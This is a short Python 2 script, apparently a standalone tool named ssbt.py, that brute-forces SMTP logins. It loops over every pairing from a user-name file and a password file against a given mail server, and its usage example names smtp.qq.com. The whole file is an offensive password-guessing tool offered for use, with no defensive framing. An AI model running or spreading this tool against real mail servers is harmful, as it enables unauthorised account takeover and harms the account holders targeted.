#! /usr/bin/env python
#coding=utf-8
#code: youstar
#data:20120419
import socket,sys, smtplib, re,codecs,time
from smtplib import SMTP

def readpw(filename,info):
        hfile = codecs.open(filename,'r','utf-8')
        for line in hfile.readlines():
                line = line.strip()
                info.append(line)
        hfile.close()
        
def testport(ip):
        try:    
                helo = smtplib.SMTP(ip)
                #print helo.helo()
                helo.quit()
        except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException):
                print "Server doesn't support the Helo cmd"
                sys.exit(2)

def brutesmtp(tuser,tpass):
        global ip
        try:
                print "-"*12
                print "User:",tuser,"Password:",tpass
                smtp = smtplib.SMTP(ip)
                smtp.login(tuser, tpass)
                print "\t\nLogin successful:",user, tpass
                smtp.quit()
                sys.exit(2)
        except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), msg: 
                print "An error occurred:", msg
                pass 
def brutehelp():
        print "\n|---------------------------------------------------------------|"
        print "|      youstar[@]foxmail[dot]com  v1.0                          |"
        print "|      4/2012      ssbt.py                                      |"
        print "|      --brute smtp mail tool--                                 |"
        print "| Usage:    ssbt.py  smtpip 'user file'  'password file'        |"
        print "| Example:  ssbt.py  smtp.qq.com user.txt  passwd.txt           |"
        print "|---------------------------------------------------------------|\n"
        sys.exit(1) 
if __name__=='__main__':
        user = [];passwd = [];ip=''
        if len(sys.argv) != 4:
                brutehelp()
        else:
                ip = sys.argv[1]
                testport(ip)
                readpw(sys.argv[2],user)
                readpw(sys.argv[3],passwd)
                for iuser in user:
                        for ipasswd in passwd:
                                brutesmtp(iuser,ipasswd)
                                time.sleep(10)
                        
        
        